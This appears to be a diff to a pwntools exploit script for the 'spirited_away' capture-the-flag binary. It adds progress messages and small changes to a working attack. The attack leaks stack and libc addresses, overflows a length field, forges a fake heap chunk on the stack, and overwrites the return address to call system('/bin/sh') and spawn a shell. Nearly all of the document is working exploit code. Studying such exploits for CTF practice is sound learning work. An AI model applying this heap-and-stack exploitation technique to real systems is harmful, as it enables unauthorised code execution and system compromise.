@@ -26,11 +26,11 @@ leak_hex = lambda r, offset=0: int(r, 16) - offset
 leak_dec = lambda r, offset=0: int(r, 10) - offset
 pad = lambda len=1, c=b'A': c * len
 
-exe = ELF("spirited_away_patched")
-libc = ELF("libc_32.so.6")
-ld = ELF("./ld-2.23.so")
+exe = ELF("spirited_away_patched", checksec=False)
+libc = ELF("libc_32.so.6", checksec=False)
+ld = ELF("./ld-2.23.so", checksec=False)
 
-context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
+context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
 context.binary = exe
 
 gdbscript = '''
@@ -68,6 +68,7 @@ def input_data(name, age, reason, comment):
         sa(p, b'comment', comment)
         sleep(0.01)
 
+print("Leaking stack and libc address")
 input_data(b'A', -1, pad(80), b'A')
 ru(p, pad(80))
 
@@ -81,6 +82,7 @@ lg("libc base", libc.address)
 
 sla(p, b'<y/n>', b'y')
 
+print("Overflow to overwrite len")
 for i in range(9):
     input_data(pad(60), -1, pad(80), pad(60))
     sla(p, b'<y/n>', b'y')
@@ -91,6 +93,7 @@ for i in range(90):
     sla(p, b'<y/n>', b'y')
     sleep(0.01)
 
+print("Fake heap layout on stack to free it")
 heap_layout = flat(
     0, 0x41,
     p32(0) * 14,
@@ -102,17 +105,20 @@ if args.GDB:
     sleep(1)
 
 layout_addr = stack - 0x68
-input_data(pad(), -1, heap_layout, pad(84) + p32(layout_addr))
+input_data(b'A', -1, heap_layout, pad(84) + p32(layout_addr))
 
 sla(p, b'<y/n>', b'y')
 
+print("Allocate heap chunk on stack to overwrite return address")
 pl = flat(
     pad(0x4c),
     libc.symbols['system'],
     pad(4),
     binsh(libc)
 )
+input_data(pl, -1, b'A', b'A')
 
-input_data(pl, -1, pad(), pad())
-
+print("Spawn shell")
+sla(p, b'<y/n>', b'n')
+rr(p, 1)
 ia(p)
